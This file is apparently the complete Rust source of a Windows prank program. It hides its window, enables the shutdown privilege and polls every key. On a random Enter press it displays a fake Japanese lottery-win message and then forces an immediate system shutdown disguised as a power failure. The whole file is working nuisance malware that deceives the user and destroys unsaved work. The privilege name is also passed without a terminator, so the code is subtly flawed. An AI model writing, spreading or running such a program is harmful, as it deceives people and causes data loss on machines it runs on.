#![windows_subsystem = "windows"]

use anyhow::*;
use rand::{thread_rng, Rng};
use std::{mem::zeroed, ptr::null_mut, thread::sleep, time::Duration};
use utf16_literal::utf16;
use winapi::{
    ctypes::c_int,
    shared::{
        minwindef::{FALSE, TRUE},
        ntdef::{LPTSTR, LUID},
        winerror::ERROR_SUCCESS,
    },
    um::{
        errhandlingapi::GetLastError,
        processthreadsapi::{GetCurrentProcess, OpenProcessToken},
        reason::SHTDN_REASON_MAJOR_POWER,
        securitybaseapi::AdjustTokenPrivileges,
        winbase::LookupPrivilegeValueA,
        winnt::{
            SE_PRIVILEGE_ENABLED, SE_SHUTDOWN_NAME, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
            TOKEN_QUERY,
        },
        winuser::{
            ExitWindowsEx, GetAsyncKeyState, MessageBoxW, EWX_FORCE, EWX_SHUTDOWN, VK_RETURN,
        },
    },
};

fn main() -> Result<()> {
    let mut rng = thread_rng();

    if !enable_privileges(SE_SHUTDOWN_NAME.to_string().as_mut_ptr() as _, true) {
        bail!("could not enable privileges.")
    }

    loop {
        let mut brk = false;

        sleep(Duration::from_millis(1));

        for i in 0 as c_int..255 as c_int {
            if unsafe { GetAsyncKeyState(i) == -32767 } {
                if i == VK_RETURN {
                    if rng.gen_range(0..100) < 5 {
                        brk = true;
                        break;
                    }
                }
            }
        }

        if brk {
            break;
        }
    }

    unsafe {
        MessageBoxW(
            null_mut(),
            utf16!("5000兆円が当選しました！\0").as_ptr(),
            utf16!("おめでとうございます！\0").as_ptr(),
            0x00,
        );
    }
    shutdown();
    Ok(())
}

fn enable_privileges(lp_privilege_name: LPTSTR, enable: bool) -> bool {
    unsafe {
        let mut h_token = null_mut();
        let mut luid = zeroed::<LUID>();
        let mut token_privileges = zeroed::<TOKEN_PRIVILEGES>();
        let mut ret = false;

        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut h_token,
        ) == FALSE
        {
            return false;
        };

        if LookupPrivilegeValueA(null_mut(), lp_privilege_name, &mut luid) == TRUE {
            token_privileges.PrivilegeCount = 1;
            token_privileges.Privileges[0].Luid = luid;
            token_privileges.Privileges[0].Attributes =
                if enable { SE_PRIVILEGE_ENABLED } else { 0 };

            AdjustTokenPrivileges(
                h_token,
                FALSE,
                &mut token_privileges,
                0,
                null_mut(),
                null_mut(),
            );

            ret = if GetLastError() == ERROR_SUCCESS {
                true
            } else {
                false
            };
        }

        return ret;
    }
}

fn shutdown() {
    unsafe { ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_POWER) };
}
